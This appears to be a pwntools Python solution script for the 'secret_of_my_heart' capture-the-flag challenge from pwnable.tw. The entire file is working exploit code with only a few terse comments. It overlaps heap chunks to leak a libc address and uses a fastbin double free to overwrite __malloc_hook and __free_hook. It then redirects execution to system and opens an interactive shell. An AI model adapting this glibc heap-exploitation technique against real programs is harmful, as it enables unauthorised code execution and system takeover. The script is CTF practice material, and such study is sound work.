
from pwn import *
#p=remote('chall.pwnable.tw',10302)
p = process("./secret_of_my_heart")
e=ELF('./libc_64.so.6')
p.recvuntil('Your choice :')
context(log_level='debug')
def ad(a,b,c):
    p.sendline('1')
    p.recvuntil('Size of heart :')
    p.sendline(str(a))
    p.recvuntil('Name of heart :')
    p.sendline(b)
    p.recvuntil('secret of my heart :')
    p.send(c)
    p.recvuntil('Your choice :')
def de(a):
    p.sendline('3')
    p.recvuntil('Index')
    p.sendline(str(a))
    p.recvuntil('Your choice :')
#gdb.attach(p)
ad(0xf8,'0','/bin/sh'+chr(0))
ad(0x68,'1','/bin/sh'+chr(0))
ad(0xf8,'2','/bin/sh'+chr(0))
ad(0x68,'3','/bin/sh')
ad(0x68,'4','123')
de(1)
de(0)
ad(0x68,'0','/bin/sh'+chr(0)+'a'*0x58+p64(0x170)) #0
de(2)
ad(0xf8,'1','/bin/sh'+chr(0))#1
p.sendline('2')
p.recvuntil('Index :')
p.sendline('0')
p.recvuntil('Secret : ')
libc=u64(p.recv(6)+chr(0x0)*2)-0x3c3b78
malloc_hook=libc+e.symbols['__malloc_hook']-0x23+0x18
ad(0x68,'2','123')#2
#Now the 2ed nameptr and the 0 nameptr point the same addr
#So we will free the 0 chunk and the 2ed chunk (but must not together)
de(0)
de(3)
de(2)
 
free_hook=libc+e.symbols['__free_hook']
system=libc+e.symbols['system']
gdb.attach(p) 
ad(0x68,'123',p64(malloc_hook))
 
ad(0x68,'123','123')
ad(0x68,'123','123')
 
#Next malloc will return the addr we want(malloc_hook)
ad(0x68,'123',chr(0x0)*0x1b+p64(0)+p64(0x70)*3+p64(malloc_hook+0x2b))

ad(0x68,'123',chr(0)*0x38+p64(free_hook-0xb58))

for i in range(0,19):
    ad(0x90,'123','123')
ad(0x90,'123','a'*8+p64(system-0x1000))
p.sendline('3')
p.recvuntil('Index')
p.sendline('1')
p.interactive()
